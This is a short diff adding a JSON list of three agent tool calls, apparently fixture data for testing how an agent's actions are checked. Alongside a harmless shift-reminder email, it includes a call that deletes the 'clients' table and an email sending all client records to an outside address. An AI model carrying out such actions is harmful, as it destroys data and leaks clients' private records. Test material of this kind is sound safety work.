@@ -1,0 +1,5 @@
+[
+  { "tool": "send_email", "arguments": { "to": "volunteer@example.org", "body": "Your shift starts at 10." } },
+  { "tool": "delete_records", "arguments": { "table": "clients" } },
+  { "tool": "send_email", "arguments": { "to": "outside@example.invalid", "body": "Attached are all client records." } }
+]
